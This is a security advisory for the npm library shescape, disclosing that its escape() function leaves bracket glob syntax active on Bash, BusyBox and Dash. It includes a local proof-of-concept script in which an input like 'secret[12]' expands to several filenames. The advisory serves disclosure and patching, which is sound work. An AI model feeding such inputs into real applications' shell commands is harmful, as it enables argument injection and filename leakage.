# [M] Shescape escape() leaves bracket glob expansion active on Bash, BusyBox, and Dash

## Summary
Severity: Medium
Advisory: GHSA-9jfh-9xrq-4vwm
CVE: CVE-2026-32094
CWE: CWE-200
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X (CVSS_V4)
Published: 2026-03-11
Source: https://github.com/advisories/GHSA-9jfh-9xrq-4vwm
Type: github-advisory

## Affected
- npm: `shescape` — affected >=0 <2.1.10

## Details
### Summary

`Shescape#escape()` does not escape square-bracket glob syntax for Bash, BusyBox `sh`, and Dash. Applications that interpolate the return value directly into a shell command string can cause an attacker-controlled value like `secret[12]` to expand into multiple filesystem matches instead of a single literal argument, turning one argument into multiple trusted-pathname matches.

### Details

The unquoted Unix escape helpers never add `[` or `]` to their “special characters” regexes:

- `src/internal/unix/bash.js:14-30`
- `src/internal/unix/busybox.js:14-30`
- `src/internal/unix/dash.js:12-19`

They escape `*`/`?` but not brackets, so `new Shescape({ shell: "/usr/bin/bash" }).escape("secret[12]")` still produces `secret[12]`. The fixtures (`test/fixtures/unix.js:2236-2265`, `3496-3525`, `5762-5792`) are currently written to expect literal brackets for these shells, confirming the behavior. The documentation recommends `Shescape#escape()` as the fallback for `exec` when quoting isn’t possible (`docs/recipes.md:154-183`).

### Proof of Concept

Use the published npm tarball without modifications:

```shell
tmp=$(mktemp -d)
cd "$tmp"
npm pack shescape@2.1.9 >/dev/null
mkdir pkg
tar -xzf shescape-2.1.9.tgz -C pkg
cd pkg/package
npm install --omit=dev

node --input-type=module - <<'NODE'
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { execSync } from "node:child_process";
import { Shescape } from "./src/index.js";

const dir = mkdtempSync(path.join(tmpdir(), "shescape-ghsa-poc-"));
writeFileSync(path.join(dir, "secret1"), "");
writeFileSync(path.join(dir, "secret2"), "");

for (const shell of ["/usr/bin/bash", "/usr/bin/dash"]) {
  const shescape = new Shescape({ shell });
  const escaped = shescape.escape("secret[12]");
  console.log(${shell} escaped=${escaped});
  const out = execSync(printf '<%s>\\n' ${escaped}, { cwd: dir, shell }).toString();
  process.stdout.write(out);
}
NODE
```

Output:

```text
/usr/bin/bash escaped=secret[12]
<secret1>
<secret2>
/usr/bin/dash escaped=secret[12]
<secret1>
<secret2>
```

Expected: the shell receives `secret\[12\]`, so only one literal argument runs.

### Impact

Argument injection: a single untrusted argument expands into multiple pathname matches from the trusted filesystem. This can change command behavior, target unintended files, or leak filenames. Any application calling `Shescape#escape()` with Bash/BusyBox/Dash shells and interpolating the result into a shell command string is affected.

## References
- https://github.com/ericcornelissen/shescape/security/advisories/GHSA-9jfh-9xrq-4vwm
- https://nvd.nist.gov/vuln/detail/CVE-2026-32094
- https://github.com/ericcornelissen/shescape/pull/2410
- https://github.com/ericcornelissen/shescape/commit/6add105c6f6b508662bb5ae3b3bdd4c9bcebf37a
- https://github.com/ericcornelissen/shescape
- https://github.com/ericcornelissen/shescape/releases/tag/v2.1.10
